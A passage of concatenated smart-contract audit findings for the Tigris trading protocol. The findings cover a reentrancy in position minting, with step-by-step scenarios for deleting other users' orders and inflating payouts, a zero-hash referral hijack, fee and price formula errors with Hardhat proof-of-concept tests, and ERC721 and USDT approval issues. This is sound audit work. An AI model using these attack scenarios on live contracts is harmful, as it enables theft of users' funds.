_trades[newTokenID];         newTrade.margin = _mintTrade.margin;         newTrade.leverage = _mintTrade.leverage;         newTrade.asset = _mintTrade.asset;         newTrade.direction = _mintTrade.direction;         newTrade.price = _mintTrade.price;         newTrade.tpPrice = _mintTrade.tp;         newTrade.slPrice = _mintTrade.sl;         newTrade.orderType = _mintTrade.orderType;         newTrade.id = newTokenID;         newTrade.tigAsset = _mintTrade.tigAsset;          _safeMint(_mintTrade.account, newTokenID);   // make external call because of safeMint() usage         if (_mintTrade.orderType > 0) { // update the values of some storage functions             _limitOrders[_mintTrade.asset].push(newTokenID);             _limitOrderIndexes[_mintTrade.asset][newTokenID] = _limitOrders[_mintTrade.asset].length-1;         } else {             initId[newTokenID] = accInterestPerOi[_mintTrade.asset][_mintTrade.tigAsset][_mintTrade.direction]*int256(_mintTrade.margin*_mintTrade.leverage/1e18)/1e18;             _openPositions.push(newTokenID);             _openPositionsIndexes[newTokenID] = _openPositions.length-1;              _assetOpenPositions[_mintTrade.asset].push(newTokenID);             _assetOpenPositionsIndexes[_mintTrade.asset][newTokenID] = _assetOpenPositions[_mintTrade.asset].length-1;         }         _tokenIds.increment();     } ``` As you can see by calling `_safeMint()` code would make external call to `onERC721Received()` function of the account address and the code sets the values for `_limitOrders[]`, `_limitOrderIndexes[]`, `initId[]`, `_openPositions[]`, `_openPositionsIndexes[]`, `_assetOpenPositions[]`, `_assetOpenPositionsIndexes[]` and `_tokenIds`. so code don't follow check-effect-interaction pattern and it's possible to perform reentrancy attack. there could be multiple scenarios that attacker can perform the attack and do some damage. two of them are:   **scenario #1 where attacker remove other users limit orders and create broken storage state** 1. attacker contract would call `initiateLimitOrder()` and code would create the limit order and mint it in the `Position._safeMint()` with ID1. 2. then code would call attacker address in `_safeMint()` function because of the `onERC721Received()` call check. 3. variables `_limitOrders[]`, `_limitOrderIndexes[ID1]` are not yet updated for ID1 and `_limitOrderIndexes[ID1]` is 0x0 and ID1 is not in `_limitOrder[]` list. 4. attacker contract would reenter the Trading contract by calling `cancelLimitOrder(ID1)`. 5. `cancelLimitOrder()` checks would pass and would tries to call `Position.burn(ID1)`. 6. `burn()` function would tries to remove ID1 from `_limitOrders[]` list but because `_limitOrderIndexes[ID1]` is 0 so code would remove the 0 index limit order which is belongs to another user. 7. execution would return to `Position.mint()` logic and code would add burned id token to `_limitOrder[]` list.  so there is two impact here, first other users limit order got removed and the second is that contract storage had bad state and burned tokens get stock in the list.   **scenario #2 where attacker steal contract/users funds by wrong profit calculation** 1. attacker's contract would call `initiateMarketOrder(lowMargin)` to create position with ID1 while the margin is low. 2. code would mint position token for attacker and in `_safeMint()` would make external call and call `onERC721Received()` function of attacker address. 3. the value of `initId[ID1]` is not yet set for ID1. 4. attacker contract would call `addToPosition(ID1, bigMargin)` to increase the margin of the position the `_checkDelay()` check would pass because both actions are opening position. 5. code would increase the margin of the position and set the value of the `initId[ID1]` by calling `position.addToPosition()` and the value were be based on the `newMargin`. 6. the execution flow would receive the rest of `Position.mint()` function and code would set `initId[ID1]` based on old margin value. 7. then the value of `initId[ID1]` for attacker position would be very low which would cause `accInterest` to be very higher than it supposed to be for position(in `Position.trades()` function calculations ) and would cause `_payout` value to be very high (in `pnl()` function's calculations) and when attacker close position ID1 attacker would receive a lot more profit from it.  so attacker created a position with a lot of profit by reentering the logics and manipulating calculation of the profits for the position.  there can be other scenarios possible to perform and damage the protocol or users because there is no reentrancy protection mechanism and attacker only need to bypass validity checks of functions.  ## Tools Used VIM  ## Recommended Mitigation Steps follow the check-effect-interaction pattern.
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Referrals.sol#L20-L24 https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/TradingExtension.sol#L148-L152   # Vulnerability details  ## Impact By default the value of `_referred[user]` is 0x0 for all users and if one set 0x0 as his referral hash then he would become referral for all the users who didn't set referral by default and he would earn a lot of referral funds that users didn't approve it.  ## Proof of Concept This is `createReferralCode()` code: ```     function createReferralCode(bytes32 _hash) external {         require(_referral[_hash] == address(0), "Referral code already exists");         _referral[_hash] = _msgSender();         emit ReferralCreated(_msgSender(), _hash);     } ``` As you can see attacker can become set 0x0 as his hash referral by calling `createReferralCode(0x0)` and code would set `_referral[0x0] = attackerAddress` (attacker needs to be the first one calling this). Then in the `getRef()` code the logic would return `attackerAddress` as referral for all the users who didn't set referral. ```     function getRef(         address _trader     ) external view returns(address) {         return referrals.getReferral(referrals.getReferred(_trader));     } ``` in the code, getReferred(trader) would return 0x0 because trader didn't set referred and getReferral(0x0) would return attackerAddress. `_handleOpenFees()` and `_handleCloseFees()` function in the Trading contract would use `getRef(trader)` and they would transfer referral fee to attackerAddress and attacker would receive fee form a lot of users which didn't set any referral, those users didn't set any referral and didn't approve attacker receiving referral fees from them and because most of the users wouldn't know about this and referral codes so attacker would receive a lot of funds.  ## Tools Used VIM  ## Recommended Mitigation Steps prevent some one from setting 0x0 hash for their referral code.
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L178 https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L734   # Vulnerability details  ## Impact  Formula for `fee paid` in [Line 734](https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L734) is incorrect leading to incorrect margin calculations. Since this directly impacts the trader margin and associated fee calculations, I've marked as HIGH risk  On initiating a market order, `Margin` is adjusted for the `fees` that is charged by protocol. This adjustment is in [Line 178 of Trading](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L178). Fees computed by `_handleOpenFees ` is deducted from Initial margin posted by user.  formula misses to account the `2*referralFee` component while calculaing `_feePaid`  ## Proof of Concept Note that `_feePaid` as per formula in Line 734 is the sum of `_daoFeesPaid', and sum of `burnerFee` & `botFee`. `_daoFeesPaid` is calculated from `_fees.daoFees` which itself is calculated by subtracting `2*referralFee` and `botFee`.   So when we add back `burnerFee` and `botFee` to `_feePaid`, we are missing to add back the `2*referralFee`  which was earlier excluded when calculating `_daoFeesPaid`. While `botFee` is added back correctly, same adjustment is not being done viz-a-viz referral fee.   This results in under calculating the `_feePaid` and impacts the rewards paid to the protocol NFT holders.   ## Tools Used  ## Recommended Mitigation Steps  Suggest replacing the formula in line 734 with below (adding back _fees.referralFees*2)  ```             _feePaid =                 _positionSize                 * (_fees.burnFees + _fees.botFees + _fees.referralFees*2 )                  / DIVISION_CONSTANT // divide by 100%                 + _daoFeesPaid; ``` 
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/IllIllI-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/IllIllI-G.md).
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L97-L125   # Vulnerability details  ## Description The current implementation forces a user to extend their bonds for at least they current bond period. These mean that, for instance, a bond which was initially locked for 365 can never be extended, even after a week of being created.  If we consider that a bond should have at least a 7 days lock and at the most 365 days, then the current ```BondNFT.extendLock``` function should be refactored.  ## Impact * Current ```BondNFT.extendLock``` function does not work as expected, forcing user who want to extend their bond to extend them at least for their current bond.period. * For bonds which were set with a lock period of 365 days, they can not be extended, even after days of their creation.  ## POC ```typescript // In 09.Bond.js,  describe "Extending lock" it("POC: Extending the lock does not work as expected", async function () {       await stabletoken.connect(owner).mintFor(user.address, ethers.utils.parseEther("100"));       // user lock bond funds for 10 days       await lock.connect(user).lock(StableToken.address, ethers.utils.parseEther("100"), 10);        const fiveDaysTime = 5 * 24 * 60 * 60       const eightDaysTime = 8 * 24 * 60 * 60        // owner distribute rewards       console.log("User created a lock for 10 days")       await stabletoken.connect(owner).mintFor(owner.address, ethers.utils.parseEther("10"));       await bond.connect(owner).distribute(stabletoken.address, ethers.utils.parseEther("10"));        // Five days pass       await network.provider.send("evm_increaseTime", [fiveDaysTime]); // Skip 10 days       await network.provider.send("evm_mine");       console.log("\n5 days pass")        // User decide to extend their lock three days, given the current implementation the user is forced to extended 13 days       const bondInfoBeforeExtension = await bond.idToBond(1)       console.log(`Bond info before extension: {period: ${bondInfoBeforeExtension.period}, expireEpoch: ${bondInfoBeforeExtension.expireEpoch}}`)              await lock.connect(user).extendLock(1, 0, 3)       console.log("Bond was extended for 3 days")       const bondInfoAfterExtension = await bond.idToBond(1)       console.log(`Bond info after extension: {period: ${bondInfoAfterExtension.period}, expireEpoch: ${bondInfoAfterExtension.expireEpoch}}`)        // 8 days pass, user should be able to release the bond given the extension of 3 days (8 days should be enough)       await network.provider.send("evm_increaseTime", [eightDaysTime]);       await network.provider.send("evm_mine");       console.log("\n8 days later")       console.log("After 13 days (10 original days + 3 days from extension) the user can not release the bond")              // The user decide to claim their part and get their bond amount       // The user should recieve all the current funds in the contract       await expect(lock.connect(user).release(1)).to.be.revertedWith('!expire')      }); ```  ## Mitigation steps In order to ```extendLock``` to work properly, the current implementation  should be changed to: ```diff function extendLock(     uint _id,     address _asset,     uint _amount,     uint _period,     address _sender ) external onlyManager() {     Bond memory bond = idToBond(_id);     Bond storage _bond = _idToBond[_id];     require(bond.owner == _sender, "!owner");     require(!bond.expired, "Expired");     require(bond.asset == _asset, "!BondAsset");     require(bond.pending == 0); //Cannot extend a lock with pending rewards +   uint currentEpoch = block.timestamp/DAY; -   require(epoch[bond.asset] == block.timestamp/DAY, "Bad epoch");     require(epoch[bond.asset] == currentEpoch, "Bad epoch");  +   uint pendingEpochs = bond.expireEpoch - currentEpoch; +   uint newBondPeriod = pendingEpochs + _period; +   //In order to respect min bond period when we extend a bon +   // Next line can be omitted at discretion of the protocol and devs +   // If it is omitted any created bond would be able to be extended always (except from those with period = 365) +   require(newBondPeriod >= 7, "MIN PERIOD");  -    require(bond.period+_period <= 365, "MAX PERIOD"); +    require(newBondPeriod <= 365, "MAX PERIOD");          unchecked { -       uint shares = (bond.amount + _amount) * (bond.period + _period) / 365; +       uint shares = (bond.amount + _amount) * newBondPeriod / 365;  -       uint expireEpoch = block.timestamp/DAY + bond.period + _period; +       uint expireEpoch = currentEpoch + newBondPeriod;          totalShares[bond.asset] += shares-bond.shares;         _bond.shares = shares;         _bond.amount += _amount;         _bond.expireEpoch = expireEpoch;         _bond.period += _period;         _bond.mintTime = block.timestamp;  -       _bond.mintEpoch = epoch[bond.asset]; +       _bond.mintEpoch = currentEpoch; -       bondPaid[_id][bond.asset] = accRewardsPerShare[bond.asset][epoch[bond.asset]] * _bond.shares / 1e18; +       bondPaid[_id][bond.asset] = accRewardsPerShare[bond.asset][currentEpoch] * _bond.shares / 1e18;     }     emit ExtendLock(_period, _amount, _sender,  _id); } ```
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L247 https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L285   # Vulnerability details  Both `BondNFT` and `GovNFT` are an ERC721 implementation, they both also have a function named `safeTransferMany()` which its name implies is supposed to safe transfer many tokens at once. However the function doesn't actually safe transfer (doesn't )  ## Impact Users might use this function, expecting it to verify that the receiver is an `ERC721Receiver`, but will get their funds stuck in a contract that doesn't support ERC721.  ## Proof of Concept I've added the following tests to the `GovNFT` tests. 1st test will succeed (tx will revert) since `safeTransferFrom()` does actually use safe transfer. 2nd will fail (tx won't revert), since `safeTransferMany()` doesn't actually use a safe transfer.  ```diff diff --git a/test/05.GovNFT.js b/test/05.GovNFT.js index 711a649..d927320 100644 --- a/test/05.GovNFT.js +++ b/test/05.GovNFT.js @@ -98,6 +98,14 @@ describe("govnft", function () {        expect(await govnft.pending(owner.getAddress(), StableToken.address)).to.equal(1500);        expect(await govnft.pending(user.getAddress(), StableToken.address)).to.equal(500);      }); + +    it("Safe transfer to non ERC721Receiver", async function () { +       +      expect(govnft.connect(owner)['safeTransferFrom(address,address,uint256)'](owner.address,StableToken.address, 2)).to.be.revertedWith("ERC721: transfer to non ERC721Receiver implementer"); +    }); +    it("Safe transfer many  to non ERC721Receiver", async function () { +      await expect(govnft.connect(owner).safeTransferMany(StableToken.address, [2])).to.be.revertedWith("ERC721: transfer to non ERC721Receiver implementer"); +    });      it("Transferring an NFT with pending delisted rewards should not affect pending rewards", async function () {        await govnft.connect(owner).safeTransferMany(user.getAddress(), [2,3]);        expect(await govnft.balanceOf(owner.getAddress())).to.equal(0);  ```  Output (I've shortened the output. following test will also fail, since the successful transfer will affect them):  ```       ✔ Safe transfer to contract       1) Safe transfer many to contract     11 passing (3s)   1 failing    1) govnft        Reward system related functions          Safe transfer many to contract:        AssertionError: Expected transaction to be reverted       + expected - actual        -Transaction NOT reverted.       +Transaction reverted. ```   ## Recommended Mitigation Steps Call `_safeTransfer()` instead of `_transfer()`.
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L19-L20   # Vulnerability details  ## Impact In GovNFT, setMaxBridge function is provided to set maxBridge, but this variable is not used, literally it should be used to limit the number of GovNFTs crossing chain, but it doesn't work in GovNFT. ```solidity     uint256 public maxBridge = 20; ...     function setMaxBridge(uint256 _max) external onlyOwner {         maxBridge = _max;     } ``` ## Proof of Concept https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L19-L20 https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L311-L313 ## Tools Used None ## Recommended Mitigation Steps Consider applying the maxBridge variable
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/0xSmartContract-Q.md).
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L295   # Vulnerability details  ## Impact The formula used for calculating ````_newPrice```` in ````addToPosition()```` function of Trading.sol is not correct, users will lose part of their funds/profit while using this function.  The wrong formula  ``` uint _newPrice = _trade.price*_trade.margin/_newMargin + _price*_addMargin/_newMargin; ```  The correct formula is ``` uint _newPrice = _trade.price * _price * _newMargin /  (_trade.margin * _price + _addMargin * _trade.price); ```  Why this workS? Given ``` P1 = _trade.price P2 = _price P = _newPrice M1 = _trade.margin M2 = _addMargin M =  M1 + M2 = _newMargin L = _trade.leverage U1 = M1 * L  = old position in USD U2 = M2 * L = new position in USD U = U1 + U2 = total position in USD E1 = U1 / P1 = old position of base asset, such as ETH, of the pair E2 = U2 / P2 = new position of base asset of the pair E = E1 + E2 = total position of base asset of the pair ```  Then ``` P = U / E   = (U1 + U2) / (E1 + E2)   = (M1 * L + M2 * L) / (U1 / P1 + U2 / P2)   = P1 * P2 * (M1 * L + M2 * L) / (U1 * P2 + U2 * P1)   = P1 * P2 * (M1 + M2) * L / (M1 * L * P2 + M2 * L * P1)   = P1 * P2 * (M1 + M2) * L / [(M1 * P2 + M2 * P1) * L]   = P1 * P2 * M / (M1 * P2 + M2 * P1) ``` proven.  ## Proof of Concept The following test case shows two examples that users lose some funds due to add new position whenever their existing position is in profit or loss state.  ``` const { expect } = require("chai"); const { deployments, ethers, waffle } = require("hardhat"); const { parseEther, formatEther } = ethers.utils; const { signERC2612Permit } = require('eth-permit'); const exp = require("constants");  describe("Incorrect calculation of new margin price while adding position", function () {   let owner;   let node;   let user;   let node2;   let node3;   let proxy;    let Trading;   let trading;    let TradingExtension;   let tradingExtension;    let TradingLibrary;   let tradinglibrary;    let StableToken;   let stabletoken;    let StableVault;   let stablevault;    let position;    let pairscontract;   let referrals;    let permitSig;   let permitSigUsdc;    let MockDAI;   let mockdai;   let MockUSDC;   let mockusdc;    let badstablevault;    let chainlink;    beforeEach(async function () {     await deployments.fixture(['test']);     [owner, node, user, node2, node3, proxy] = await ethers.getSigners();     StableToken = await deployments.get("StableToken");     stabletoken = await ethers.getContractAt("StableToken", StableToken.address);     Trading = await deployments.get("Trading");     trading = await ethers.getContractAt("Trading", Trading.address);     await trading.connect(owner).setMaxWinPercent(5e10);     TradingExtension = await deployments.get("TradingExtension");     tradingExtension = await ethers.getContractAt("TradingExtension", TradingExtension.address);     const Position = await deployments.get("Position");     position = await ethers.getContractAt("Position", Position.address);     MockDAI = await deployments.get("MockDAI");     mockdai = await ethers.getContractAt("MockERC20", MockDAI.address);     MockUSDC = await deployments.get("MockUSDC");     mockusdc = await ethers.getContractAt("MockERC20", MockUSDC.address);     const PairsContract = await deployments.get("PairsContract");     pairscontract = await ethers.getContractAt("PairsContract", PairsContract.address);     const Referrals = await deployments.get("Referrals");     referrals = await ethers.getContractAt("Referrals", Referrals.address);     StableVault = await deployments.get("StableVault");     stablevault = await ethers.getContractAt("StableVault", StableVault.address);     await stablevault.connect(owner).listToken(MockDAI.address);     await stablevault.connect(owner).listToken(MockUSDC.address);     await tradingExtension.connect(owner).setAllowedMargin(StableToken.address, true);     await tradingExtension.connect(owner).setMinPositionSize(StableToken.address, parseEther("1"));     await tradingExtension.connect(owner).setNode(node.address, true);     await tradingExtension.connect(owner).setNode(node2.address, true);     await tradingExtension.connect(owner).setNode(node3.address, true);     await network.provider.send("evm_setNextBlockTimestamp", [2000000000]);     await network.provider.send("evm_mine");     permitSig = await signERC2612Permit(owner, MockDAI.address, owner.address, Trading.address, ethers.constants.MaxUint256);     permitSigUsdc = await signERC2612Permit(owner, MockUSDC.address, owner.address, Trading.address, ethers.constants.MaxUint256);      const BadStableVault = await ethers.getContractFactory("BadStableVault");     badstablevault = await BadStableVault.deploy(StableToken.address);      const ChainlinkContract = await ethers.getContractFactory("MockChainlinkFeed");     chainlink = await ChainlinkContract.deploy();      TradingLibrary = await deployments.get("TradingLibrary");     tradinglibrary = await ethers.getContractAt("TradingLibrary", TradingLibrary.address);     await trading.connect(owner).setLimitOrderPriceRange(1e10);   });     describe("Initial margin $500, leverage 2x, position $1000, price $1000", function () {     let orderId;     let initPrice = parseEther("1000");     beforeEach(async function () {       // To simpliy the problem, set fees to 0       await trading.setFees(true, 0, 0, 0, 0, 0);       await trading.setFees(false, 0, 0, 0, 0, 0);        let TradeInfo = [parseEther("500"), MockDAI.address, StableVault.address, parseEther("2"), 1, true, parseEther("0"), parseEther("0"), ethers.constants.HashZero];       let PriceData = [node.address, 1, initPrice, 0, 2000000000, false];       let message = ethers.utils.keccak256(         ethers.utils.defaultAbiCoder.encode(           ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],           [node.address, 1, initPrice, 0, 2000000000, false]         )       );       let sig = await node.signMessage(         Buffer.from(message.substring(2), 'hex')       );              let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];       orderId = await position.getCount();       await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);       expect(await position.assetOpenPositionsLength(1)).to.equal(1);       let trade = await position.trades(orderId);       let marginAfterFee = trade.margin;       expect(marginAfterFee.eq(parseEther('500'))).to.equal(true);       expect(trade.price.eq(parseEther('1000'))).to.be.true;       expect(trade.leverage.eq(parseEther('2'))).to.be.true;     });      it.only("Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual payout $1666", async function () {       // The price increases from $1000 to $2000, the old position earns $1000 profit.       // The expected PnL payout = old margin + earned profit + new margin       //                         = $500 + $1000 + $500       //                         = $2000       let addingPrice = parseEther('2000');       let addingPriceData = [node.address, 1, addingPrice, 0, 2000000000, false];       let addingMessage = ethers.utils.keccak256(         ethers.utils.defaultAbiCoder.encode(           ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],           [node.address, 1, addingPrice, 0, 2000000000, false]         )       );       let addingSig = await node.signMessage(         Buffer.from(addingMessage.substring(2), 'hex')       );        let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];       await trading.connect(owner).addToPosition(orderId, parseEther('500'), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);        let trade = await position.trades(orderId);       let pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,         trade.margin, trade.leverage, trade.accInterest);       expect(pnl._payout.gt(parseEther('1666'))).to.be.true;       expect(pnl._payout.lt(parseEther('1667'))).to.be.true;     });      it.only("Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $714", async function () {       // The price decreases from $1000 to $750, the old position losses $250.       // The expected PnL payout = old margin - loss + new margin       //                         = $500 - $250 + $500       //                         = $750       let addingPrice = parseEther('750');       let addingPriceData = [node.address, 1, addingPrice, 0, 2000000000, false];       let addingMessage = ethers.utils.keccak256(         ethers.utils.defaultAbiCoder.encode(           ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],           [node.address, 1, addingPrice, 0, 2000000000, false]         )       );       let addingSig = await node.signMessage(         Buffer.from(addingMessage.substring(2), 'hex')       );        let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];       await trading.connect(owner).addToPosition(orderId, parseEther('500'), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);        let trade = await position.trades(orderId);       let pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,         trade.margin, trade.leverage, trade.accInterest);       expect(pnl._payout.gt(parseEther('714'))).to.be.true;       expect(pnl._payout.lt(parseEther('715'))).to.be.true;     });    }); });  ```  The test result ``` Incorrect calculation of new margin price while adding position     Initial margin $500, leverage 2x, position $1000, price $1000       √ Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual payout $1666       √ Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $714 ```  ## Tools Used hardhat  ## Recommended Mitigation Steps Use the correct formula, the following test case is for the same above examples after fix.  ``` const { expect } = require("chai"); const { deployments, ethers, waffle } = require("hardhat"); const { parseEther, formatEther } = ethers.utils; const { signERC2612Permit } = require('eth-permit'); const exp = require("constants");  describe("Correct calculation of new margin price while adding position", function () {   let owner;   let node;   let user;   let node2;   let node3;   let proxy;    let Trading;   let trading;    let TradingExtension;   let tradingExtension;    let TradingLibrary;   let tradinglibrary;    let StableToken;   let stabletoken;    let StableVault;   let stablevault;    let position;    let pairscontract;   let referrals;    let permitSig;   let permitSigUsdc;    let MockDAI;   let mockdai;   let MockUSDC;   let mockusdc;    let badstablevault;    let chainlink;    beforeEach(async function () {     await deployments.fixture(['test']);     [owner, node, user, node2, node3, proxy] = await ethers.getSigners();     StableToken = await deployments.get("StableToken");     stabletoken = await ethers.getContractAt("StableToken", StableToken.address);     Trading = await deployments.get("Trading");     trading = await ethers.getContractAt("Trading", Trading.address);     await trading.connect(owner).setMaxWinPercent(5e10);     TradingExtension = await deployments.get("TradingExtension");     tradingExtension = await ethers.getContractAt("TradingExtension", TradingExtension.address);     const Position = await deployments.get("Position");     position = await ethers.getContractAt("Position", Position.address);     MockDAI = await deployments.get("MockDAI");     mockdai = await ethers.getContractAt("MockERC20", MockDAI.address);     MockUSDC = await deployments.get("MockUSDC");     mockusdc = await ethers.getContractAt("MockERC20", MockUSDC.address);     const PairsContract = await deployments.get("PairsContract");     pairscontract = await ethers.getContractAt("PairsContract", PairsContract.address);     const Referrals = await deployments.get("Referrals");     referrals = await ethers.getContractAt("Referrals", Referrals.address);     StableVault = await deployments.get("StableVault");     stablevault = await ethers.getContractAt("StableVault", StableVault.address);     await stablevault.connect(owner).listToken(MockDAI.address);     await stablevault.connect(owner).listToken(MockUSDC.address);     await tradingExtension.connect(owner).setAllowedMargin(StableToken.address, true);     await tradingExtension.connect(owner).setMinPositionSize(StableToken.address, parseEther("1"));     await tradingExtension.connect(owner).setNode(node.address, true);     await tradingExtension.connect(owner).setNode(node2.address, true);     await tradingExtension.connect(owner).setNode(node3.address, true);     await network.provider.send("evm_setNextBlockTimestamp", [2000000000]);     await network.provider.send("evm_mine");     permitSig = await signERC2612Permit(owner, MockDAI.address, owner.address, Trading.address, ethers.constants.MaxUint256);     permitSigUsdc = await signERC2612Permit(owner, MockUSDC.address, owner.address, Trading.address, ethers.constants.MaxUint256);      const BadStableVault = await ethers.getContractFactory("BadStableVault");     badstablevault = await BadStableVault.deploy(StableToken.address);      const ChainlinkContract = await ethers.getContractFactory("MockChainlinkFeed");     chainlink = await ChainlinkContract.deploy();      TradingLibrary = await deployments.get("TradingLibrary");     tradinglibrary = await ethers.getContractAt("TradingLibrary", TradingLibrary.address);     await trading.connect(owner).setLimitOrderPriceRange(1e10);   });     describe("Initial margin $500, leverage 2x, position $1000, price $1000", function () {     let orderId;     let initPrice = parseEther("1000");     beforeEach(async function () {       // To simpliy the problem, set fees to 0       await trading.setFees(true, 0, 0, 0, 0, 0);       await trading.setFees(false, 0, 0, 0, 0, 0);        let TradeInfo = [parseEther("500"), MockDAI.address, StableVault.address, parseEther("2"), 1, true, parseEther("0"), parseEther("0"), ethers.constants.HashZero];       let PriceData = [node.address, 1, initPrice, 0, 2000000000, false];       let message = ethers.utils.keccak256(         ethers.utils.defaultAbiCoder.encode(           ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],           [node.address, 1, initPrice, 0, 2000000000, false]         )       );       let sig = await node.signMessage(         Buffer.from(message.substring(2), 'hex')       );              let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];       orderId = await position.getCount();       await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);       expect(await position.assetOpenPositionsLength(1)).to.equal(1);       let trade = await position.trades(orderId);       let marginAfterFee = trade.margin;       expect(marginAfterFee.eq(parseEther('500'))).to.equal(true);       expect(trade.price.eq(parseEther('1000'))).to.be.true;       expect(trade.leverage.eq(parseEther('2'))).to.be.true;     });      it.only("Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual payout $1999.99999", async function () {       // The price increases from $1000 to $2000, the old position earns $1000 profit.       // The expected PnL payout = old margin + earned profit + new margin       //                         = $500 + $1000 + $500       //                         = $2000       let addingPrice = parseEther('2000');       let addingPriceData = [node.address, 1, addingPrice, 0, 2000000000, false];       let addingMessage = ethers.utils.keccak256(         ethers.utils.defaultAbiCoder.encode(           ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],           [node.address, 1, addingPrice, 0, 2000000000, false]         )       );       let addingSig = await node.signMessage(         Buffer.from(addingMessage.substring(2), 'hex')       );        let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];       await trading.connect(owner).addToPosition(orderId, parseEther('500'), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);        let trade = await position.trades(orderId);       let pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,         trade.margin, trade.leverage, trade.accInterest);       expect(pnl._payout.gt(parseEther('1999.99999'))).to.be.true;       expect(pnl._payout.lt(parseEther('2000'))).to.be.true;     });      it.only("Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $749.99999", async function () {       // The price decreases from $1000 to $750, the old position losses $250.       // The expected PnL payout = old margin - loss + new margin       //                         = $500 - $250 + $500       //                         = $750       let addingPrice = parseEther('750');       let addingPriceData = [node.address, 1, addingPrice, 0, 2000000000, false];       let addingMessage = ethers.utils.keccak256(         ethers.utils.defaultAbiCoder.encode(           ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],           [node.address, 1, addingPrice, 0, 2000000000, false]         )       );       let addingSig = await node.signMessage(         Buffer.from(addingMessage.substring(2), 'hex')       );        let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];       await trading.connect(owner).addToPosition(orderId, parseEther('500'), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);        let trade = await position.trades(orderId);       let pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,         trade.margin, trade.leverage, trade.accInterest);       expect(pnl._payout.gt(parseEther('749.99999'))).to.be.true;       expect(pnl._payout.lt(parseEther('750'))).to.be.true;     });    }); });  ```  The test result ``` Correct calculation of new margin price while adding position     Initial margin $500, leverage 2x, position $1000, price $1000       √ Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual payout $1999.99999       √ Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $749.99999 ``` 
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/Faith-G.md).
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L652   # Vulnerability details  ## Impact  Traders will not be able to: 1. Initiate a market order 2. Add margin 3. Add to position 4. initiate limit order  If USDT is set as the margin asset and protocol is deployed on ethereum.  (Note: this issue was submitted after consulting with the sponsor even though currently there are no plans to deploy the platform on ethereum)  ## Proof of Concept  `USDT` has a race condition protection mechanism on ethereum chain: It does not allow users to change the allowance without first changing the allowance to 0.   `approve` function in `USDT` on ethereum: https://etherscan.io/token/0xdac17f958d2ee523a2206206994597c13d831ec7#code#L205 ```     function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {          // To change the approve amount you first have to reduce the addresses`         //  allowance to zero by calling `approve(_spender, 0)` if it is not         //  already 0 to mitigate the race condition described here:         //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729         require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));          allowed[msg.sender][_spender] = _value;         Approval(msg.sender, _spender, _value);     } ```  in `Trading` if users use `USDT` 